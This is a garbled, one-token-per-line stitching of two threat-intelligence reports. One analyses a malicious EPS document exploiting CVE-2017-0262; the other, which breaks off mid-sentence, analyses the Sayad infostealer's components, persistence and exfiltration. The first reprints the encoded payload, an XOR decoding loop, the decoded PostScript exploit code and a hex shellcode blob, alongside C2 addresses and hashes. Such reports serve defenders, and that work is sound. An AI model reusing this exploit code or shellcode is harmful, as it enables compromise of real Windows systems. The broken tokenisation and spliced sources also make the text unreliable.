6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
def
<
017d71681f3128450e343d415a3b374e1e3b314e0e7d6f104a7d2d431b313b4615332a0009382a4615332a001d3131421b313a491
9297e421f3a374e5a721f11497d66104a6d6e105a393b465a721f11487d1f11497d6f165a343a490c7d6f001b393a001e383800551c660
0017d71614f697e45023e36001e383800551c6c165a382643127d3a451c7d7161496a7e61486b7e4c1f333954127d3a451c7d71614f6a7e
614f697e4c1f333954127d3a451c7d71614e6c7e124f6b7e441f3b7e0f3b6c6f003b6e69003b696f001339375
[
...
]
0077d7e00
>
%
%
quit
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
Myheartisjusttoodarktocare
%
%
Icantdestroywhatisntthere
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
A4
%
%
6b61737065722d7069646f72206b61
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
A3
%
%
6b61737065722d7069646f72206b61
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
exec
%
%
6b61737065722d7069646f72206b61
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
%
%
6b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f72206b61737065722d7069646f7220
showpage
quit
Step
4
.

Decoding
the
payload

Using
the
multibyte
XOR
Key
(
7a5d5e20
)
,
the
payload
can
be
decoded
by
XOR'ing
each
byte
of
the
payload
with
its
(
position
%
4
)
in
the
XOR
key
.

For
example
,
position
0
in
the
payload
is
XOR
'd
against
0x7a
,
position
1
is
XOR
'd
against
0x5d
,
position
2
is
XOR
'd
against
0x5e
,
position
3
is
XOR
'd
against
0x20
.

Then
the
cycle
repeats
for
subsequent
payload
bytes
.

Code
similar
to
what
's
pasted
below
would
decode
it
(
acBuffer
is
payload
,
acKeys
is
XOR
key
)
.

for
(
int
ctr
=
0
;
ctr
<
sizeof
(
acPayload
)
-
1
;
ctr++
)
{
printf
(
'
%
c
'
,
acPayload
[
ctr
]
^
(
acKeys
[
(
ctr
%
4
)
]
)
)
;
}

This
results
in
the
decoded
payload
snippet
pasted
below
.

Highlighted
is
most
likely
an
encoded
payload
used
in
the
next
stage
.

Also
highlighted
below
are
Windows
DLL
and
function
artifacts
indicating
maliciousness
.

{
/Helvetica
findfont
100
scalefont
setfont
globaldict
begin
/A13
800000
def
/A12
A13
16
idiv
1
add
def
/A8
{
/A54
exch
def
/A26
exch
def
/A37
A26
length
def
/A57
A54
length
def
/A41
256
def
/A11
A37
A41
idiv
def
{
/A11
A11
1
sub
def
A11
0
lt
{
exit
}
if
A26
A11
A41
mul
A54
putinterval
}
loop
A26
}
bind
def
/A61
{
dup
-16
bitshift
/A43
exch
def
65535
and
/A34
exch
def
dup
-16
bitshift
/A22
exch
def
65535
and
dup
/A63
exch
def
A34
sub
65535
and
A22
A43
sub
A63
A34
sub
0
lt
{
1
}
{
0
}
ifelse
sub
16
bitshift
or
}
bind
def
/A60
{
dup
-16
bitshift
/A43
exch
def
65535
and
/A34
exch
def
dup
-16
bitshift
/A22
exch
def
65535
and
dup
/A59
exch
def
A34
add
65535
and
A22
A43
add
A59
A34
add
-16
bitshift
add
16
bitshift
or
}
bind
def
/A17
{
/A46
exch
def
A18
A46
get
A18
A46
1
A60
get
8
bitshift
A60
A18
A46
2
A60
get
16
bitshift
A60
A18
A46
3
A60
get
24
bitshift
A60
}
bind
def
/A2
{
/A45
exch
def
/A20
exch
def
A18
A20
A45
255
and
put
A18
A20
1
A60
A45
-8
bitshift
255
and
put
A18
A20
2
A60
A45
-16
bitshift
255
and
put
A18
A20
3
A60
A45
-24
bitshift
255
and
put
}
bind
def
/A47
{
A18
exch
get
}
bind
def
/A29
{
2147418112
and
/A56
exch
def
{
A18
A56
get
77
eq
{
A18
A56
1
A60
get
90
eq
{
A56
60
A60
A17
dup
512
lt
{
A56
A60
dup
A47
80
eq
{
1
A60
A47
69
eq
{
exit
}
if
}
{
pop
}
ifelse
}
{
pop
}
ifelse
}
if
}
if
/A56
A56
65536
sub
def
}
loop
A56
}
bind
def
/A51
{
/A33
exch
def
/A38
exch
def
/A44
A38
dup
60
A60
A17
A60
def
A18
A44
25
A60
get
dup
01
eq
{
pop
/A62
A38
A44
128
A60
A17
A60
def
/A32
A44
132
A60
A17
def
}
{
02
eq
{
/A62
A38
A44
144
A60
A17
A60
def
/A32
A44
148
A60
A17
def
}
if
}
ifelse
0
0
20
A32
1
A61
{
/A49
exch
def
/A50
A62
A49
A60
12
A60
A17
def
A50
0
eq
{
quit
}
if
A18
A38
A50
A60
14
getinterval
A33
search
{
length
0
eq
{
pop
pop
pop
A62
A49
A60
exit
}
if
pop
}
if
pop
}
for
}
bind
def
/A40
{
/A27
exch
def
/A23
exch
def
/A53
A23
A27
A51
def
A53
16
A60
A17
A23
A60
A17
A29
}
bind
def
/A35
{
/A42
exch
def
/A30
exch
def
/A58
exch
def
/A39
A58
A30
A51
def
/A25
A39
A17
A58
A60
def
/A21
0
def
{
/A24
6/9
A25
A21
A60
A17
def
A24
0
eq
{
0
exit
}
if
A18
A58
A24
A60
50
getinterval
A42
search
{
length
2
eq
{
pop
pop
A39
16
A60
A17
A58
A60
A21
A60
A17
exit
}
if
pop
}
if
pop
/A21
A21
4
A60
def
}
loop
}
bind
def
/A31
589567
string
<
00d0800d30d0800d000000000200000010d0800d020000003cd0800d0005000000000000000000005cd0800d00000300000000000000000020d0800d3cd0800d6cd0800d00000000f0ffff7f50d0800d00000000f1ffff7f
>
A8
def
500
{
A31
589567
string
copy
pop
}
repeat
1
array
226545696
forall
/A19
exch
def
/A18
exch
def
/A16
A12
array
def
A19
1
A16
put
/A9
226545696
56
add
A17
A17
def
A9
/A36
exch
A17
A29
def
/A10
A36
4096
A60
def
A9
/A68
exch
36
A60
A17
A17
40
A60
A17
def
/A7
A18
A10
458752
getinterval
def
/A4
{
/A64
exch
def
A7
A64
search
{
length
A10
A60
exch
pop
exch
pop
}
{
quit
}
ifelse
}
bind
def
/A1
{
A7
<
50
45
>
search
{
length
A10
A60
exch
pop
exch
pop
}
{
quit
}
ifelse
}
bind
def
/A28
A36
(
KERNEL32.dll
)
A40
def
/A3
A18
A28
4096
getinterval
def
/A1
{
A3
<
50
45
>
search
{
length
A28
A60
exch
pop
exch
pop
}
{
quit
}
ifelse
}
bind
def
/A15
{
A1
64
A60
A17
255
and
}
bind
def
A15
6
ne
{
quit
}
if
/A14
A28
(
ntdll.dll
)
(
NtProtectVirtualMemory
)
A35
def
/A67
<
94
c3
>
A4
def
/A65
A67
1
A60
def
/A66
<
c2
0c
>
A4
def
/A55
A68
65536
A60
def
/A52
A55
256
A60
def
/A48
A55
512
A60
def
/A6
A48
def
A52
A68
A2
A52
4
A60
A13
A2
A16
0
A55
put
A55
A55
4
A60
A2
A55
4
A60
A66
A2
A55
8
A60
A65
A2
A55
20
A60
A67
A2
A55
24
A60
A14
A2
A55
28
A60
A48
A2
A55
32
A60
-1
A2
A55
36
A60
A52
A2
A55
40
A60
A52
4
A60
A2
A55
44
A60
64
A2
A55
48
A60
A52
8
A60
A2
A68
2304
A2
/A5
A16
def
A18
A6
<
558bec83ec3053e8a40200008945fc8b45fc83c030508b4dfc83c11851e80e05000083c40450e81504000083c4088b55fc8982a80000008b45fc83c048508b4dfc83c11851e8e604000083c40450e8ed03000083c4088b55fc8982ac0000008b45fc0590000000508b4dfc83c118518b55fc8b82a8000000ffd0508b4dfc8b91ac000000ffd28b4dfc8981b40000008b55fc83c278528b45fc508b4dfc8b91a8000000ffd2508b45fc
[
...
]
fd1a498994b7304ea2bf01272c6cc14b66ade7023b2fd8915d1bc7ac4b32bb89803b92980d328ec43b434d1f0620d5249e9eda8b50f1acfd50804566981d4af2b10c79acfa503e83f66c4b8b87e95748bbf6c7b6b39eb83cfe118f7b8ae9e877589c64db6e428832fd5899b413eaf351bc81004c65490f3667fe61eeb1c651c7ffd43188a9c33ce90e59032c103d45babfb945cd49b8111c4ed8fd9e6dca127ce5620c8502566f9b9c157a406b66c20c7b830ef45bbcb4e3ab6f0136a5b7f6e58602a1ff626ab174eb2cd98ca6b5dcada7fbc84846e53c042b6807505b89eaebca8145dcf30537e94a9244c3fe54a59ccd7c30cfe2def768f54e6d9569546c35b39e920145617f84c3fe20a9d6ddd2982ff661a4b1141571deb4e5666062604c4f4c4b454b588945fc8b45fc5f5e5b8be55dc3
putinterval
A5
0
get
bytesavailable
}

Of
particular
in
this
last
snippet
is
the
block
with
the
'forall
'
which
is
the
memory
corruption
routine
unique
to
the
known
exploit
code
for
CVE-2017-0262
,
and
as
described
in
ESETs
analysis
on
the
subject
.

With
bit-for-bit
copy
of
CVE-2017-0262
exploit
code
,
we
have
reasonable
confidence
that
the
exploit
we
are
dealing
with
is
in
fact
CVE-2017-0262
.

Step
5
.

Second
stage
payload

The
second-stage
payload
(
<
558bec83ec3053e8a40200008945fc8b45fc83c030508b4dfc8...
)
appears
to
be
a
simple
hex-encoded
blob
(
no
XOR
decoding
needed
)
.

Converting
it
from
hex
to
binary
and
running
the
UNIX
strings
command
on
it
yields
the
following
interesting
artifacts
that
hint
what
the
next
stage
will
be...

QSVW
ntdll.dll
kernel32.dll
LoadLibraryA
GetProcAddress
NtAllocateVirtualMemory
NtProtectVirtualMemory
GetCurrentProcess
QSVW
fff^
HJON
r|kw
ijxip7
}
uu
Uvx
}
Up
{
kxk'X
^|mIkvzX
}
}
k|
pm|_pu|
KmuPwpmLwpzv
}
|Jmkpw~
^|m\wopkvwt|wmOxkpx
{
Mqk|x
}
^|mIkvz|jjPtx~|_pu|Wxt|X
Nkpm
8Mqpj9ikv~kxt9z-wwvm9
{
|9klw9pw9
]
)
J9tv
}
|
,
Kpzqg
7m|am
Y7
}
xmx
7kjkz
jZp
'
!
zjt
...

7/9

Command
and
Control

The
malware
performs
calls
back
to
137.74.224[.]142 B_ip.cncsvr
,
at
five
second
intervals
(
Figure
6
)
.

Figure
6
Malware
C2
in
Wireshark
,
courtesy
VXStream

The
destination
hosts
offers
an
HTTP
200
response
and
'false
'
.

GET
/z/get.php?name=c3857e72
HTTP/1.1

Host
:
137.74.224.142 B_ip.cncsvr

HTTP/1.1
200
OK

Date
:
Thu
,
10
Aug
2017
06:59:01
GMT

Server
:
Apache/2.4.10
(
Debian
)

Content-Length
:
5

Content-Type
:
text/html
;
charset=UTF-8

False

We
believe
that
the
actors
would
not
invoke
remote
control
unless
they
had
ruled
out
nosy
researchers
.

Based
on
Google
searches
identifying
the
C2
IP
address
(
137.74.224[.]142 B_ip.cncsvr
)
as
an
established
Minecraft
(
multiplayer
game
)
server
,
we
suspect
it
is
possible
that
the
host
has
been
compromised
by
the
perpetrators
and
is
being
used
without
the
permission
of
the
owner
.

Other
previous
URL
resolutions
may
be
associated
with
prior
customers
of
the
virtual
private
server
(
Figure
7
)
.

Figure
7
Historic
DNS
resolutions
for
C2
IP
address
,
courtesy
PassiveTotal

During
the
course
of
this
research
we
found
some
similarities
in
look
and
feel
of
this
campaign
(
and
its
potential
attribution
)
with
past
FirstWatch
posts
in
Attacking
a
POS
Supply
Chain
part-1
and
CHTHONIC
and
DIMNIE
Campaign
Targets
Russia
8-2-2017
.

8/9

Thanks
to
Kent
Backman
,
Kevin.Douglas2@rsa.com
,
and
Christopher
Elisan
for
all
their
contributions
to
this
research
.

Appendix B_hash

Md5
hashes
of
EPS
exploit
docx
with
C2
of
137.74.224[.]142 B_ip.cncsvr

0c718531890dc54ad68ee33ed349b839 B_hash

9c7e70f0369215004403b1b289111099 B_hash

e589ae71722ac452a7b6dd657f31c060 B_hash

68e190efe7a5c6f1b88f866fc1dc5b88 B_hash

630db8d3e0cb939508910bd5c93e09fe B_hash

c43f1716d6dbb243f0b8cd92944a04bd B_hash

df0f8fb172ee663f6f190b0b01acb7bf B_hash

ed74331131da5ac4e8b8a1c818373031 B_hash

e8ea2ce5050b5c038e3de727e266705c B_hash

5df8067a6fcb6c45c3b5c14adb944806 B_hash

104913aa3bd6d06677c622dfd45b6c6d B_hash

00b470090cc3cdb30128c9460d9441f8 B_hash

f8ce877622f7675c12cda38389511f57 B_hash

7c80fb8ba6cf094e709b2d9010f972ba B_hash

cfc0b41a7cde01333f10d48e9997d293 B_hash

69de4a5060671ce36d4b6cdb7ca750ce B_hash

18c29bc2bd0c8baa9ea7399c5822e9f2 B_hash

3be61ecba597022dc2dbec4efeb57608 B_hash

b57dff91eeb527d9b858fcec2fa5c27c B_hash

1bb8eec542cfafcb131cda4ace4b7584 B_hash

4c1bc95dd648d9b4d1363da2bad0e172 B_hash

d9a5834bde6e65065dc82b36ead45ca5 B_hash

7743e239c6e4b3912c5ccba04b7a287c B_hash

MD5
hash
of
EPS
exploit
with
C2
of
158.69.218[.]119 B_ip.cncsvr

57f51443a8d6b8882b0c6afbd368e40e B_hash

9/9
Sayad B_malware.infosteal
(
Flying
Kitten
)
Infostealer
–
is
this
the
work
of
the
Iranian
Ajax
Security
Team
?

Information
stealing
malware
has
become
increasingly
popular
among
malware
authors
targeting
not
just
typical
end-users
,
but
also
specific
organizations
and
states
.

We
have
come
across
an
intriguing
piece
of
malware
(
dubbed
Sayad B_malware.infosteal
)
that
implements
multiple
host
data
collection
methods
and
wraps
them
up
into
a
single
.NET
DLL
.

Sayad B_malware.infosteal
malware
is
typically
distributed
through
phishing
emails
.

Introduction

This
week
I
got
hold
of
a
sample
of
'Sayad B_malware.infosteal
'
,
so
I
ran
it
through
our
Vinsula
Execution
Engine
(
VEE
)
to
find
out
what
it
does
and
how
it
works
.

Credit
for
sharing
the
sample
of
the
malware
goes
to
@
MalwareChannel
.

The
information
this
malware
is
able
to
steal
and
upload
to
a
Web
server
controlled
by
the
hackers
is
highly
sensitive
and
would
have
an
enormous
impact
on
compromised
individuals
,
businesses
,
and
governments
.

Some
of
the
tasks
Sayad B_malware.infosteal
is
designed
to
accomplish
include
:

Get
and
send
host
system
information
,
including
:

Host
computer
name

Internal
and
external
IPs

Languages
installed

User
name

Running
processes

Open
ports

Capture
and
record
keystrokes
through
a
user
mode
key
logger

Periodically
capture
information
stored
in
the
clipboard

Collect
and
transfer
user
information
for
FTP
Clients
–
FileZilla
and
WinSCP

Get
data
account
information
for
FileZilla
FTP
Server

Transfer
Kerio
VPN
client
user
configuration
files

Collect
and
transfer
bookmarks
for
Chrome
,
Firefox
,
Internet
Explorer
,
and
Opera

Steal
browser
cookies
for
Chrome
,
Firefox
,
Internet
Explorer
,
and
Opera

Collect
and
transfer
history
for
Chrome
,
Firefox
,
Internet
Explorer
,
and
Opera

Capture
any
registered
proxies

Get
and
transfer
the
start
URL
for
each
installed
browser

Collect
and
transfer
chat
history
for
Skype
,
Yahoo
Messenger
,
Pidgin
,
and
GTalk

Steal
RDP
,
Putty
accounts
Collect

VPN
related
account
information
for
Proxifier
and
WinVPN

Determine
if
the
currently
logged
on
user
is
running
as
admin

At
the
time
of
writing
of
this
post
,
the
detection
rate
for
Sayad B_malware.infosteal
malware
binary

(
SHA2:8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12 B_hash
)
at
VirusTotal
is
zero
.

There
are
several
interesting
aspects
of
Sayad B_malware.infosteal
malware
,
and
after
running
the
malicious
executable
through
the
Vinsula
Execution
Engine
to
analyze
its
behavior
,
I
discovered
that
the
initial
executable
titled
WEXTRACT.exe
(
SHA1:1c52b749403d3f229636f07b0040eb17beba28e4 B_hash
)
was
in
fact
a
self
extracting
EXE
that
dropped
and
launched
the
Binder
executable
malware
,
~8f60957b3689075fa093b047242c0255.exe
(
SHA1:69fd05ca3a7514ea79480d1dbb358fab391e738d B_hash
)
.

Once
the
Binder
executable
malware
is
launched
,
it
checks
the
.NET
version
installed
on
the
machine
and
drops
the
information
stealer
DLL
component
,
Sayad B_malware.infosteal
(
aka
Client
)
–
DiagnosticsService.dll
(
SHA1:8521eefbf7336df5c275c3da4b61c94062fafdda B_hash
)
.

Sayad B_malware.infosteal
has
some
characteristics
that
make
it
unique
:

Sayad B_malware.infosteal
has
been
designed
by
someone
who
seems
to
have
a
.NET
OOP/OOD
background

It
uses
some
non-traditional
methods
for
native
to
.NET
interop
like
exporting
a
manged
API
through
the
native
Export
Address
Table

The
malware
uses
an
oversimplified
form
of
obfuscation
for
string
utilizing
Base64
encoding
which
in
fact
can
be
easily
de-obfuscated

Our
collegues
from
NCC
Group
's
Cyber
Defence
Operations
published
an
article
titled
'A
new
Flying
Kitten
?
'

with
some
details
around
Sayad B_malware.infosteal
malware
and
its
possible
link
to
the
activities
of
the
Iranian
hacking
group
'Ajax
Security
Team
.
'

Attack
Overview

The
diagram
below
outlines
the
key
elements
of
the
attack
.

The
malware
executable
is
delivered
by
a
phishing
email
or
the
user
is
somehow
tricked
into
downloading
it
and
executing
it
.

Once
the
user
clicks
on
the
malware
,
it
extracts
the
actual
malware
executable
and
launches
it
.

Analysis

Our
first
step
was
to
run
the
'Sayad B_malware.infosteal
'
binary
through
our
Vinsula
Execution
Engine
to
find
out
just
what
it
does
.

The
process
tree
below
as
reported
by
our
engine
allows
us
to
visually
present
the
parent/child
relationship
between
all
the
processes
and
their
command
lines
related
to
the
execution
for
this
specific
malware
.

explorer.exe
[
Process
Id
:
140
]
+
WEXTRACT.exe
[
Process
Id
:
3508
]
+
~8f60957b3689075fa093b047242c0255.exe
[
Process
Id
:
2544
]
+
rundll32.exe
[
Process
Id
:
2596
]
+
cvtres.exe
[
Process
Id
:
256
]
Cmd
line
:
rundll32.exe
'DiagnosticsService.dll',78121
+
csc.exe
[
Process
Id
:
2672
]
+
csc.exe
[
Process
Id
:
3548
]
+
cvtres.exe
[
Process
Id
:
3280
]

For
the
sake
of
shortness
,
in
this
post
we
omit
the
command
line
details
in
the
process
tree
above
for
the
csc.exe
and
cvtres.exe
instances
.

For
the
same
reason
,
we
also
do
n't
show
the
complete
command
line
of
the
rundll32.exe
.

Because
this
is
an
important
detail
,
here
is
how
it
shows
up
in
our
Vinsula
malware
report
:

rundll32.exe
'C
:
\Users\
[
User
]
\AppData\Roaming\Client\DiagnosticsService.dll',78121

Sayad B_malware.infosteal
malware
is
a
self-contained
executable
that
embeds
within
itself
all
the
required
malicious
components
,
meaning
that
it
does
n't
need
to
download
any
additional
malicious
content
from
the
C2
server
,
which
may
appear
suspicious
.

Its
three
core
components
are
structured
as
'Russian
Dolls
,
'
i.e.
,
one
wrapped
within
the
next
in
layers
.

Here
is
the
list
with
the
key
components
starting
from
the
outermost
one
.

Hashes
of
all
investigated
components
are
provided
at
the
end
of
this
post
.

Self-extracting
executable
(
WEXTRACT.exe
)

Binder
(
~8f60957b3689075fa093b047242c0255.exe
)

Client
(
DiagnosticsService.dll
)

Further
down
,
I
will
go
into
greater
detail
and
provide
more
information
about
the
behavior
and
static
building
blocks
of
each
of
these
components
.

For
now
,
I
am
just
aiming
to
capture
the
scope
of
each
executable
involved
in
the
orchestration
of
the
Sayad B_malware.infosteal
malware
.

As
we
can
see
in
the
cascade
tree
above
,
the
main
malware
WEXTRACT.exe
is
a
self-extracting
executable
which
extracts
the
Binder
~8f60957b3689075fa093b047242c0255.exe
,
and
it
then
launches
it
.

The
Binder
is
responsible
for
checking
the
installed
.NET
version
and
extracting
the
relevant
.NET
Client
–
DiagnosticsService.dll
.

This
.NET
DLL
implements
the
data
collecting
logic
and
sends
the
collected
data
to
the
C2
server
.

The
following
diagram
captures
a
bit
more
of
the
detail
of
the
malware
workflow
.

The
main
self-extracting
binary
WEXTRACT.exe
drops
two
files
in
the
user
's
appdata
temp
directory
as
shown
in
the
following
entries
from
our
Vinsula
report
.

These
two
files
are
the
two
parts
of
the
Binder
–
a
.NET
executable
(
~8f60957b3689075fa093b047242c0255.exe
)
and
its
configuration
file
(
~8f60957b3689075fa093b047242c0255.exe.config
)
.

Details
along
with
snippets
from
Binder
's
source
code
are
provided
in
the
next
sections
.

Create
[
C
:
\Users\
+
WEXTRACT.exe
[
Process
Id
:
3508
]
[
User]\AppData\Local\Temp\IXP000.TMP\~8f60957b3689075fa093b047242c0255.exe
]
[
User]\AppData\Local\Temp\IXP000.TMP\~8f60957b3689075fa093b047242c0255.exe
]
Delete
[
C
:
\Users\
Open
[
C
:
\Users\
Write
[
C
:
\Users\
[
User]\AppData\Local\Temp\IXP000.TMP\~8f60957b3689075fa093b047242c0255.exe
]
[
User]\AppData\Local\Temp\IXP000.TMP\~8f60957b3689075fa093b047242c0255.exe
]
[
User]\AppData\Local\Temp\IXP000.TMP\~8f60957b3689075fa093b047242c0255.exe.config
]
Create
[
C
:
\Users\
Delete
[
C
:
\Users\
[
User]\AppData\Local\Temp\IXP000.TMP\~8f60957b3689075fa093b047242c0255.exe.config
]
Open
[
C
:
\Users\
[
User]\AppData\Local\Temp\IXP000.TMP\~8f60957b3689075fa093b047242c0255.exe.config
]
Write
[
C
:
\Users\
[
User]\AppData\Local\Temp\IXP000.TMP\~8f60957b3689075fa093b047242c0255.exe.config
]

Here
is
the
hashes
of
the
Binder
:

Filename
:
~8f60957b3689075fa093b047242c0255.exe

MD5
:
72641dedb31280b78bf6a0f184ef29b6 B_hash

SHA1
:
69fd05ca3a7514ea79480d1dbb358fab391e738d  B_hash

This
is
what
the
two
files
dropped
by
the
self-extracting
malware
look
like
in
Windows
Explorer
.

They
are
stored
in
a
temporary
location
C
:
\Users\
[
User]\AppData\Local\Temp\IXP000.TMP
.

After
dropping
the
Binder
and
its
configuration
file
,
the
main
self-extracting
binary
launches
the
Binder
(
~8f60957b3689075fa093b047242c0255.exe
)
.

Similar
to
the
process
tree
from
our
Vinsula
report
above
,
the
below
screenshot
from
Process
Explorer
shows
the
Binder
being
launched
by
the
self-extracting
binary
.

The
purpose
of
the
Binder
is
to
create
and
drop
the
core
malware
component
(
also
titled
Client
–
DiagnosticsService.dll
)
and
its
configuration
disguised
as
a
DLL
file
,
base.dll
.

Below
is
a
snippet
from
our
Vinsula
report
capturing
the
relevant
event
entries
that
show
the
Client
and
its
configuration
being
created
.

+
WEXTRACT.exe
[
Process
Id
:
3508
]
[
User
]
\AppData\Roaming\Client\DiagnosticsService.dll
]
[
User
]
\AppData\Roaming\Client\DiagnosticsService.dll
]
Write
[
C
:
\Users\
+
~8f60957b3689075fa093b047242c0255.exe
[
Process
Id
:
2544
]
Create
[
C
:
\Users\
[
User]\AppData\Roaming\Client\base.dll
]
Write
[
C
:
\Users\
[
User]\AppData\Roaming\Client\base.dll
]
Create
[
C
:
\Users\

These
are
the
hashes
of
the
two
core
Client
related
files
:

Filename
:
DiagnosticsService.dll

MD5
:
432a79f8f1402cb2622b27e26e900d55  B_hash

SHA1
:
8521eefbf7336df5c275c3da4b61c94062fafdda  B_hash

Filename
:
base.dll

MD5
:
4a67b19c02d5cfdebcd85b7395d09881  B_hash

SHA1
:
082da03918039125dcf1f096a13ffa9ab6a56bde  B_hash

Before
digging
into
the
details
of
the
Client
,
lets
have
a
look
at
the
Binder
's
(
~8f60957b3689075fa093b047242c0255.exe
)
implementation
.

The
Binder
is
a
.NET
executable
whose
purpose
is
to
find
out
what
version
of
.NET
is
currently
installed
,
and
then
drop
the
relevant
.NET
Client
DLL
accordingly
.

There
are
two
versions
of
the
Client
DLL
that
are
stored
as
embedded
resources
in
Binder
's
executable
.

That
makes
the
malware
less
chattier
and
allows
it
to
drop
the
correct
.NET
version
DLL
without
the
need
to
download
it
from
a
malicious
Web
location
.

As
shown
in
the
above
screenshot
,
in
the
Binder
's
main
entry
point
,
the
Sayad B_malware.infosteal
malware
:

gets
the
installed
.NET
versions

modifies
the
registry
so
that
it
will
run
at
startup
using
rundll32.exe
Windows
utility
to
load
the
Client
(
DiagnosticsService.dll
)

extracts
the
relevant
.NET
Client
version
from
the
embedded
resource

depending
on
the
installed
.NET
version
,
it
copies
the
Client
(
CopySayad
method
)
to
a
user
's
directory

extract
the
configuration
information
from
the
end
of
the
Binder
's
image
using
the
method
ReadExtraDataFromEndOfBuffer

starts
up
the
Client
using
the
command
rundll32.exe
'C
:
\Users\
[
User
]
\AppData\Roaming\Client\DiagnosticsService.dll',7812

The
following
diagram
reflects
the
code
paths
in
Binder
's
Main
entry
point
as
described
in
the
section
above
.

The
Binder
ensures
that
the
malware
will
survive
reboots
by
registering
the
command
for
loading
and
executing
the
Client
DLL
(
DiagnosticsService.dll
)
to
run
at
startup
as
shown
below
.

The
following
shows
the
registry
modification
that
comes
as
a
result
of
the
executing
the
code
above
.

And
here
is
the
corresponding
registry
modification
entries
from
Vinsula
's
report
.

More
on
the
details
regarding
the
rundll32.exe
command
will
be
provided
in
the
following
sections
.

+
WEXTRACT.exe
[
Process
Id
:
3508
]
+
~8f60957b3689075fa093b047242c0255.exe
[
Process
Id
:
2544
]
Set
Key
:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Name
:
DiagnosticsService
Value:rundll32.exe
'C
:
\
[
Path
omitted]\DiagnosticsService.dll',78121
'DiagnosticsService.dll',78121
Set
Key
:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Name:78121
Value:rundll32.exe
'C:\Windows\system32\rundll32.exe',78121
+
rundll32.exe
[
Process
Id
:
2596
]
Command
:
rundll32.exe

An
interesting
aspect
of
the
implementation
of
the
Binder
assembly
is
the
way
the
malware
authors
decided
to
launch
the
Client
by
executing
the
command
rundll32.exe
'DiagnosticsService.dll',7812
and
utilizing
WinExec
API
to
launch
the
rundll32.exe
process
as
shown
below
.

The
WinExec
API
has
been
provided
only
for
backward
compatibility
with
16-bit
Windows
.

A
quick
Googling
of
the
method
names
of
the
two
methods
FromUrlSafeBase64String
ToUrlSafeBase64String
from
the
Base64.cs
file
shows
that
the
code
has
been
copied
from
the
following
stackoverflow
post
'.NET
MVC
Routing
w/
Url
Encoding
Problems
'
.

The
following
screenshot
shows
the
Binder
project
in
Visual
Studio
.

As
previously
mentioned
,
the
Binder
extracts
the
relevant
Client
DLL
according
to
the
installed
.NET
version
.

There
are
two
copies
of
the
Client
DLL
,
targeting
.NET2
and
.NET4
,
both
stored
as
embedded
resources
inside
the
Binder
file
image
.

The
Binder
is
also
responsible
for
extracting
the
configuration
data
located
at
the
end
of
the
Binder
's
file
image
and
storing
it
in
the
base.dll
file
.

The
configuration
data
is
stored
as
plain
text
and
Base64
encoded
data
and
holds
following
configuration
attributes
:

BuildId
–
a
unique
GUID
that
identifies
the
build
of
the
malware
.

For
this
sample
the
GUID
value
is
{
e5aac039-cf4a-4b1d-9507-df7001ee2637
}

PublicKey
–
this
is
a
RSA
public
key
used
for
encrypting
the
collected
data
being
uploaded
to
the
malicious
Web
site
hxxp://0o0o0o0o0.com

PostURL
–
this
is
a
URL
and
it
is
used
for
uploading
collected
data
to
the
malicious
Web
site
–
hxxp://0o0o0o0o0.com/soft.php

ResourceURL
–
a
URL
that
the
malware
uses
to
download
sqllite3.dll

ScreenShotCount
–
determines
how
many
consecutive
screenshots
need
to
be
taken
each
time

ScreenShotInterval
–
indicates
how
frequently
the
screenshots
will
be
taken

StartupScreenshot
–
determines
whether
to
take
a
screenshot
at
startup
time

Here
is
a
sample
configuration
file
base.dll

The
most
interesting
aspect
of
this
malware
is
surely
the
Sayad B_malware.infosteal
Client
(
DiagnosticsService.dll
)
.

The
malware
authors
decided
to
implement
the
core
data
collection
and
transmission
into
a
single
.NET
DLL
.

Typically
,
unknown
.NET
DLLs
do
not
look
as
suspicious
as
a
native
Win32
DLL
or
an
executable
.

Also
,
a
DLL
requires
an
executable
to
load
it
in
order
to
execute
any
code
implemented
by
the
DLL
.

Sayad B_malware.infosteal
leverages
rundll32.exe
,
which
is
a
shell
that
allows
the
loading
of
32-bit
DLLs
and
the
execution
of
exported
APIs
.

Basically
,
Sayad B_malware.infosteal
Client
is
a
32-bit
.NET
DLL
.

Rundll32.exe
would
be
able
to
load
Sayad B_malware.infosteal
Client
DLL
,
but
as
it
is
a
.NET
managed
DLL
it
does
n't
support
exporting
of
native
unmanaged
APIs
,
thus
Rundll32.exe
can
not
execute
any
of
the
.NET/C
#
public
methods
implemented
in
the
Sayad B_malware.infosteal
Client
DLL
.

Going
back
to
the
malware
process
tree
we
can
see
that
Binder
launches
the
following
command
,
which
is
instructing
Windows
utility
rundll32.exe
to
load
Sayad B_malware.infosteal
Client
DiagnosticsService.dll
,
obtain
the
function
address
of
the
native
API
named
'78121
'
via
GetProcAddress
(
)
,
and
call
the
function
pointer
of
the
entry
point
'78121
'
.

rundll32.exe
'C
:
\Users\
[
User
]
\AppData\Roaming\Client\DiagnosticsService.dll',78121
Microsoft
C
#
compiler
does
not
support
interop
via
the
export
of
unmanaged
native
APIs
from
within
a
.NET/C
#
DLL
.

However
,
if
we
open
Sayad B_malware.infosteal
Client
DLL
it
is
clear
that
the
DLL
does
export
a
native
unmanaged
API
function
titled
'78121
'
.

How
have
the
malware
authors
managed
to
export
a
native
API
from
a
C
#
DLL
?

Although
not
supported
by
Microsoft
